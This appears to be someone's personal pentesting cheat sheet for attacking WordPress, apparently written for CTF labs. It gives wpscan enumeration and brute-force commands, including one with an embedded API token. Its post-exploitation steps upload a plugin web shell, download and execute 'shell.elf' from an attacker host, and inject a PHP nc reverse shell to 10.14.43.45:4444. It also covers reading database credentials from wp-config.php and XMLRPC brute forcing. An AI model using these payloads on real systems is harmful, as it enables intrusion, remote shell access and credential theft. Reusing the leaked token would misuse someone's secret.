<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Wordpress</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Wordpress</h1><br/><p><h1>how wordpress works :</h1><ul><li>wordpress is a CMS (content management system),it&#39;s free with limited options :  <ul><li><ul><li> no domain name</li><li> can&#39;t upload plugins</li><li> can&#39;t monetize with ads ...</li><li>solution : self hosted + using wordpress.org</li></ul></li></ul></li></ul></p><p></p><p><strong><h2>Wordpress exploits common</h2></strong><ul><li> wordpress version <ul><li>e.g &lt;5.2.3 viewing unauthenticated <ul><li>/?static=1</li></ul></li><li>e.g 5.6.2 <ul><li>Authenticated XXE Within the Media Library Affecting PHP 8</li><li>a post exploit  </li></ul></li></ul></li></ul></p><p></p><p><strong><h2>WPSCAN commands</h2></strong><ul><li>wpscan --url $url --enumerate ap,at,cb,dbe |tee wpscan.log </li><li>wpscan --url $url --enumerate p --plugins-</li></ul></p><p>detection aggressive -o websrv1/wpscan<ul><li>// cb = config backups</li><li>dbe = db exports </li><li>// after we find plugins we search via searchsploit </li></ul></li><li>with token aggressive <ul><li>wpscan --url $url --plugins-detection mixed -e ap,at --api-token uGTjp6qQgK2AwCZ7ZAhQycXQJCxrklonUgFnFjI51S4 -o wpscan-aggressive.log<ul><li>// api token to be changed </li><li>more throough </li></ul></li></ul></p><p></p><p></p><p></p><p></p><p></p><p><h2> Wordpress post exploit</h2><ul><li> u got admin access creds</li><li>method #01<ul><li>install reverse shell plugins<ul><li>/usr/share/seclists/Web-Shells/WordPress/plugin-shell.php</li><li>compress in a zip file and note name of the file</li><li>sudo zip plugin-shell.zip plugin-shell.php</li><li>install now</li><li></li></ul></li></ul></li></ul><img src="images/198-1.png" alt="images/198-1.png" /><ul><li>/wp-content/plugins/plugin-shell/plugin-shell.php</li></ul></li><li>Get shell (encode parmas)<ul><li>?cmd=wget <a href="http://attacker/shell.elf">http://attacker/shell.elf</a></li><li>?cmd= chmod +x shell.elf </li><li>?cmd= .\shell.elf </li></ul></li><li>method 02: update previuous polugin<ul><li>prefix any instalkled plugin with &lt;?php system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.14.43.45 4444 &gt;/tmp/f&#39;); ?</li><li><a href="http://jack.thm/wp-admin/plugin-editor.php">/wp-admin/plugin-editor.php</a></li><li>activate the plugin</li></ul></li><li>method #02 (after RCE)<ul><li>extract database creds from config file<ul><li>/var/www/html/wp-config.php</li></ul></li></ul></li><li>method 03<ul><li>extract wp-config.php</li><li></li></ul><img src="images/198-2.png" alt="images/198-2.png" /></p><p></p><p><ul><li>method 3 add file to theme 404<ul><li>apperance =&gt; theme file editor =&gt; edit 404</li><li>$url/wp-content/themes/twentytwelve/404.php</li></ul></li></ul></p><p><h2>wordpress hashes cracking</h2></p><p><ul><li>mode 400</li></ul></p><p></p><p></p><p></p><p><h2>Wordpress XMLRPC</h2><ul><li>xmlrpc.php is a file that represents a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress REST API.</li><li>if active  you can DOS users or launch a bruteforce attack </li><li>check if active POST /xmlrpc.php<ul><li>&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;</li><li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress</a></li></ul></li></ul></p><p></p><p></p><p></p><p><h2>WPSCAN bruteforce users</h2><ul><li>wpscan -U users.txt -P /usr/share/wordlists/fasttrack.txt --url <a href="http://jack.thm">http://jack.thm</a></li></ul></p><p></p><p></p><p><h2>WOrdpress privilege escalation</h2><ul><li>searchsploit wordpress privilege escalation</li></ul></p></div>
</body>
</html>
